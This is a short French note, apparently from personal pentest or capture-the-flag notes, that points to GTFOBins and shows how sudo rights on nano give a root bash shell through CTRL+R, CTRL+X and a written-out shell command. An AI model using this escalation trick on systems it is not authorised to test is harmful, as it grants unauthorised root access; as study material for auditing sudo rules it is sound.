Voir [https://gtfobins.org]() pour pleins d'outils.

# Avec quelques accès
## Commande `nano` (root)
En effectuant `CTRL+R` puis `CTRL+X` dans `sudo nano`, ça ouvrira une ligne de commande à effectuer. Avec les privilèges *root* sur `nano`, on peut alors ouvrir un terminal bash :
```shell
reset; /bin/bash 1>&0 2>&0
```
